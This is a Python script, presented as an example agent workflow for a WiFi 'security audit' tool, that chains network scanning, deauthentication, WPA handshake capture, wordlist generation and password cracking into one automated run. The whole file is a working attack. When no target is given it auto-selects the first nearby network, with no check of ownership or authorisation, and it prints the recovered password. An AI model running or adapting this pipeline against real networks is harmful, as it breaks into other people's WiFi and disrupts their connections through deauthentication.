#!/usr/bin/env python3
"""
Example Agent Workflow Script (Python)
Demonstrates automated WiFi security audit workflow
"""

import subprocess
import json
import sys
from pathlib import Path


def run_command(cmd, json_output=True):
    """Run wifucker command and return parsed JSON"""
    if json_output:
        cmd.append("--json")
    
    result = subprocess.run(
        ["wifucker"] + cmd,
        capture_output=True,
        text=True,
        check=False
    )
    
    if result.returncode != 0:
        try:
            error_data = json.loads(result.stdout)
            raise Exception(f"Command failed: {error_data.get('error', {}).get('message', 'Unknown error')}")
        except json.JSONDecodeError:
            raise Exception(f"Command failed: {result.stderr}")
    
    return json.loads(result.stdout)


def main():
    interface = sys.argv[1] if len(sys.argv) > 1 else "wlan0"
    target_ssid = sys.argv[2] if len(sys.argv) > 2 else None
    
    print(f"[*] Starting automated WiFi audit workflow")
    print(f"[*] Interface: {interface}")
    
    try:
        # Step 1: Scan for networks
        print("[*] Step 1: Scanning for networks...")
        scan_result = run_command(["scan", interface, "--duration", "10"])
        
        if not scan_result.get("success"):
            print("[-] Scan failed")
            print(json.dumps(scan_result.get("error"), indent=2))
            return 1
        
        network_count = scan_result["data"]["count"]
        print(f"[+] Found {network_count} networks")
        
        # Step 2: Select target network
        if not target_ssid:
            target_ssid = scan_result["data"]["networks"][0]["essid"]
            print(f"[+] Auto-selected target: {target_ssid}")
        else:
            print(f"[+] Using specified target: {target_ssid}")
        
        # Step 3: Capture handshake
        print("[*] Step 2: Capturing handshake...")
        mon_interface = f"{interface}mon"
        capture_result = run_command([
            "capture", mon_interface,
            "--target-ssid", target_ssid,
            "--capture-duration", "60",
            "--deauth-count", "5",
            "--progress-file", "/tmp/capture_progress.json"
        ])
        
        if not capture_result.get("success"):
            print("[-] Capture failed")
            print(json.dumps(capture_result.get("error"), indent=2))
            return 1
        
        pcap_file = capture_result["data"]["pcap_file"]
        print(f"[+] Handshake captured: {pcap_file}")
        
        # Step 4: Parse handshake
        print("[*] Step 3: Parsing handshake...")
        parse_result = run_command(["parse", pcap_file])
        
        if not parse_result.get("success"):
            print("[-] Parse failed")
            print(json.dumps(parse_result.get("error"), indent=2))
            return 1
        
        handshake_count = parse_result["data"]["handshake_count"]
        print(f"[+] Verified {handshake_count} handshake(s)")
        
        # Step 5: Generate wordlist
        print("[*] Step 4: Generating wordlist...")
        generate_result = run_command([
            "generate", target_ssid,
            "--max-passwords", "10000"
        ])
        
        if not generate_result.get("success"):
            print("[-] Wordlist generation failed")
            print(json.dumps(generate_result.get("error"), indent=2))
            return 1
        
        wordlist_file = generate_result["data"]["output_file"]
        print(f"[+] Wordlist generated: {wordlist_file}")
        
        # Step 6: Crack password
        print("[*] Step 5: Cracking password...")
        crack_result = run_command([
            "crack", pcap_file, wordlist_file,
            "--rules",
            "--progress-file", "/tmp/crack_progress.json"
        ])
        
        if not crack_result.get("success"):
            print("[-] Cracking failed")
            print(json.dumps(crack_result.get("error"), indent=2))
            return 1
        
        found = crack_result["data"].get("found", False)
        if found:
            password = crack_result["data"]["password"]
            attempts = crack_result["data"]["attempts"]
            elapsed = crack_result["data"]["elapsed_time"]
            
            print("")
            print("=" * 50)
            print("  PASSWORD FOUND!")
            print("=" * 50)
            print(f"  SSID:     {target_ssid}")
            print(f"  Password: {password}")
            print(f"  Attempts:  {attempts:,}")
            print(f"  Time:      {elapsed:.2f}s")
            print("=" * 50)
        else:
            print("[-] Password not found in wordlist")
            print("[*] Suggestions:")
            print("    - Use a larger wordlist")
            print("    - Try: wifucker download --all")
            return 1
        
        print("")
        print("[+] Workflow complete!")
        return 0
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())

